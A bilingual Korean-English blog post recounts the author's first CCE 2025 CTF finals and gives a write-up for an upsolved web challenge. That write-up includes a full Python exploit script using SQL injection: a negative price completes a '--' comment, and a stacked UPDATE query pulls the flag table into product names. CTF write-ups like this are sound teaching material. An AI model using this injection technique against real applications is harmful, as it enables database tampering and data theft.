---
title: "CCE 2025 Finals 소감과 정보자원관리원 WriteUp"
description: "CCE 2025 Finals 소감과 정보자원관리원 WriteUp"
published: 2025-09-16
tags: [ctf]
category: hacking
draft: false
locales:
  en:
    title: "CCE 2025 Finals reflections and the Information Resources Agency write-up"
    description: "CCE 2025 Finals reflections and the Information Resources Agency write-up"
---

# CCE 2025 FINALS

:::::locale{lang=ko}
인생 첫 대규모 ctf 본선이었다. 대회장을 들어서자마자 바로 그 생각밖에 안들었던 것 같다. **진짜 커도 너무 컸다**. \
옆자리에는 간간히 얼굴만 알아오던 네임드가 앉아있고 국가에서 주최하는 대회다보니 군복을 입은(곧 나의 미래가 될) 사람들도 많았다.
:::::

:::::locale{lang=en}
This was my first ever large-scale CTF final. The moment I walked into the venue, that was the only thought in my head. **It was seriously, absurdly big**. \
Sitting next to me was a well-known name I'd only ever recognized by face, and since it was a state-run competition there were plenty of people in military uniform (soon to be my own future).
:::::

:::::locale{lang=ko}
대회가 시작될쯤 웅장한 사운드가 나의 긴장감을 더해주었다. 그렇게 3시간...
:::::

:::::locale{lang=en}
As the competition was about to begin, a grand soundtrack ratcheted up my nerves. And so, three hours passed...
:::::

:::::locale{lang=ko}
## 0솔
:::::

:::::locale{lang=en}
## Zero solves
:::::

:::::locale{lang=ko}
점심을 먹을때까지 쭉 0솔이었다. 큰 대회인만큼 문제가 어려워 0솔을 미리 예상하기는 하였지만 팀에 짐이 된다는 생각에 계속 초조해졌고 최악의 실수를 하게 되었다.
계속 풀이중이던 문제를 버리고 다른 문제로 갈아탄 것이었다. 이러면 안됬었는데... 0솔이 나더라도 ~~어짜피 수상은 못하니까~~ 한문제만 잡고 계속 풀었어야 했다.
:::::

:::::locale{lang=en}
I was at zero solves right up through lunch. Given the size of the event the problems were hard, so I'd half expected zero solves, but the thought of being a burden to the team made me increasingly anxious — and I made the worst possible mistake.
I abandoned the problem I'd been working on and switched to another one. I shouldn't have done that... Even if I ended at zero solves, ~~we weren't placing anyway~~ I should have stuck with one problem and kept at it.
:::::

:::::locale{lang=ko}
그렇게 2시까지 0솔이었다. 이렇게는 안된다고 생각하고 그나마 익숙한 안드로이드를 내세워 android 리버싱... 문제를 하나 해결한 후, 다시 웹에만 집중하였다.
:::::

:::::locale{lang=en}
So I was still at zero solves by 2 p.m. Deciding this couldn't go on, I leaned on Android — the thing I was most familiar with — solved one Android reversing problem, and then went back to focusing purely on web.
:::::

:::::locale{lang=ko}
## 전략
:::::

:::::locale{lang=en}
## Strategy
:::::

:::::locale{lang=ko}
방황은 여기까지 전략을 좀 세워보기로 했다. 
방대한 코드양을 가지고있던 취약점 패치 문제인 live fire 문제는 시간이 많이 걸릴 것 같은데 어짜피 시간이 지날수록 점수는 계속 낮아지고 해당 시첨에서 이미 500점정도? 감소된 상태라 풀어도 투자한 시간 대비 얻을 수 있는 점수가 없을 것이라고 생각하였다.
:::::

:::::locale{lang=en}
Enough wandering — I decided to actually plan. 
The live fire problem, a vulnerability-patching challenge with an enormous amount of code, looked like it would eat a lot of time; and since the score keeps dropping as time passes and had already fallen by around 500 points at that moment, I figured solving it wouldn't pay off relative to the time invested.
:::::

:::::locale{lang=ko}
그래서 gpt에게 문제파일을 통채로 넘기고 나는 그나마 솔버가 있었던 정보자원관리원 문제를 풀기 시작했다...
:::::

:::::locale{lang=en}
So I dumped the whole challenge file into GPT and started working on the Information Resources Agency problem, which at least had some solvers...
:::::

:::::locale{lang=ko}
## 바보 멍청이 말미잘
:::::

:::::locale{lang=en}
## Idiot, moron, sea anemone
:::::

:::::locale{lang=ko}
당연히 cce 문제인 만큼 gpt를 이용한 풀이는 쉽지 않았다. 과도하게 많은, 앞단에서 이미 막혀있는 취약점들을 다 찾아서 나한테 보고하였다. 심지어 SLA 테스트가 있어서 gpt한테 코드를 막 수정하라고 할 수 없어, 과감하게 버렸다.
여기까지는 맞는 판단이었던 것 같다.
:::::

:::::locale{lang=en}
Naturally, being a CCE problem, solving it with GPT wasn't easy. It dug up an excessive number of "vulnerabilities" that were already blocked upstream and dutifully reported every one of them. On top of that, there was an SLA test, so I couldn't just tell GPT to rewrite the code freely — so I boldly dropped it.
Up to here, I think the call was right.
:::::

:::::locale{lang=ko}
하지만 정보자원관리원 풀이에서 바보같은 짓을 하고 말았다.
:::::

:::::locale{lang=en}
But on the Information Resources Agency problem, I ended up doing something stupid.
:::::

:::::locale{lang=ko}
해당 문제에는 - 문자와 sql에 넘겨줄 인자 위치를 결정하는 \$1 문자가 붙어있는 쿼리가 존재하였다. \$1로 음수값을 넘겼다면 --가 완성되어 뒷부분이 주석처리되어 멀티쿼리 형식으로 sqli를 시도할 수 있었다.
하지만 나는 이를 찾아내지 못하고 약간 핀트를 잘못 잡아 \$1\$2 형식으로 붙어있는 경우만 고집하다가 결국 풀이에 실패하였다. 아니 왜 거기에만 몰두했지...
:::::

:::::locale{lang=en}
The problem had a query where a `-` character sat right next to the `\$1` placeholder that determines the position of the argument passed into SQL. If you passed a negative value through `\$1`, it completed a `--`, commenting out the rest and letting you attempt SQLi in multi-query form.
But I never spotted that; I got slightly off-target and fixated only on cases where it appeared as `\$1\$2`, and ultimately failed to solve it. Why on earth did I obsess over just that...
:::::

:::::locale{lang=ko}
신기하게도 그 부분에 몰두하여 여러가지를 시도해보는데 약 3시간정도 걸렸는데 그 시간이 엄창 짧게 느껴져 다른 방법을 시도해볼 생각을 못하였다. 풀타임으로 이 문제만 잡고 있었다면 달랐을까...
:::::

:::::locale{lang=en}
Strangely, obsessing over that spot and trying various things took about three hours, yet it felt so short that it never occurred to me to try another approach. Would it have gone differently if I'd worked on this problem full-time...
:::::

:::::locale{lang=ko}
## 업솔빙
:::::

:::::locale{lang=en}
## Upsolving
:::::

:::::locale{lang=ko}
아 풀었다
:::::

:::::locale{lang=en}
Ah, I solved it.
:::::

:::::locale{lang=ko}
이런
:::::

:::::locale{lang=en}
Oh no.
:::::

:::::locale{lang=ko}
풀고보니 쉬웠다
:::::

:::::locale{lang=en}
Once solved, it was easy.
:::::

:::::locale{lang=ko}
웹해킹은 항상 이런식이야 ㅡ.ㅡ
:::::

:::::locale{lang=en}
Web hacking is always like this ㅡ.ㅡ
:::::

:::::locale{lang=ko}
그래도 풀때 도파민이 어마어마했다.
:::::

:::::locale{lang=en}
Still, the dopamine hit when it landed was enormous.
:::::

:::::locale{lang=ko}
와 내가 그래도 2솔짜리 문제를 풀긴 풀었네
하면서..
:::::

:::::locale{lang=en}
Thinking, wow, I did actually solve a two-solve problem...
:::::

:::::locale{lang=ko}
## 롸업
:::::

:::::locale{lang=en}
## Write-up
:::::

:::::locale{lang=ko}
앞서 말했듯이. -랑 $1이 붙어있는 부분을 잘 찾아서 익스하면 된다.
음수검사가 있긴 한데
익스 보면서 알아서 상상하시길
:::::

:::::locale{lang=en}
As said above: find the spot where `-` and `$1` sit next to each other and exploit it.
There is a negative-value check, but
just picture it yourself while reading the exploit.
:::::

```python
import re
import random
import requests
from bs4 import BeautifulSoup

UUID_RE = re.compile(r'/market/([0-9a-f-]{36})/(?:buy|donate)')
def get_market_uuid(html: str, target_name: str) -> str | None:
  soup = BeautifulSoup(html, 'html.parser')
  for tr in soup.select('tbody tr'):
    tds = tr.select('td.center')
    if not tds:
      continue
    name = tds[0].get_text(strip=True)
    if name != target_name:
      continue
    for form in tr.find_all('form', action=True):
      m = UUID_RE.search(form['action'])
      if m:
        return m.group(1)
  return None

BASE = "http://192.168.163.3:5011"

# prepare

auther = requests.Session()

auther_email = f"{random.randbytes(5).hex()}@exploit.me"
auther_id = random.randbytes(5).hex()
auther_pw = random.randbytes(5).hex()

print(f"auther_id: {auther_id}")
print(f"auther_pw: {auther_pw}")

auther.post(f"{BASE}/register", {"username": auther_id, "password": auther_pw, "email": auther_email})
auther.post(f"{BASE}/login", {"username": auther_id, "password": auther_pw})

target = random.randbytes(5).hex()
auther.post(f"{BASE}/market/new", {"name": target, "description": "exploit", "price": "1"})

markets = auther.get(f"{BASE}/market").text
target_uid = get_market_uuid(markets, target)

res = auther.post(f"{BASE}/market/{target_uid}/edit", {"name": target, "description": "exploit", "price": "-1", "visible": True})

# exploit
buyer = requests.Session()

leak_price = int(random.randbytes(1).hex(), 16)

buyer_id = random.randbytes(5).hex()
buyer_pw = random.randbytes(5).hex()
buyer_email = f"{auther_id}@exploit.me"

payload = f"\n;UPDATE sales_goods SET name=f.flag FROM (SELECT * from flag) f WHERE price={leak_price} RETURNING 1--{random.randbytes(1).hex()}"

print(f"buyer_id: {buyer_id}")
print(f"buyer_pw: {buyer_pw}")
print(f"payload: \n{payload}")

res1 = buyer.post(f"{BASE}/register", {"username": buyer_id, "password": buyer_pw, "email": buyer_email})
res2 = buyer.post(f"{BASE}/login", {"username": buyer_id, "password": buyer_pw})

res3 = buyer.post(f"{BASE}/market/new", {"name": "flag", "description": "exploit", "price": leak_price})

res4 = buyer.post(f"{BASE}/profile/edit", {"edit_username": payload, "password": buyer_pw, "email": buyer_email})

res5 = buyer.post(f"{BASE}/market/{target_uid}/buy")

print(f"session: {buyer.cookies.get_dict()}")

# print(res.text)
# print(res1.text)
# print(res2.text)
# print(res3.text)
# print(res4.text)
# print(res5.text)
```

:::::locale{lang=ko}
# 여담
:::::

:::::locale{lang=en}
# Side note
:::::

:::::locale{lang=ko}
아니 무슨 다과가 겁나게 많았다. 그냥 오렌지만 통으로 13개에 캐이크만 8조각은 먹은듯\
쿠키는 취향이 아니라 덜먹었다
:::::

:::::locale{lang=en}
Seriously, there were an insane amount of refreshments. I think I ate 13 whole oranges and 8 slices of cake on their own\
The cookies weren't to my taste so I ate fewer of those.
:::::

![img.png](./IMG_1579.jpg)
![img.png](./IMG_1592.jpg)
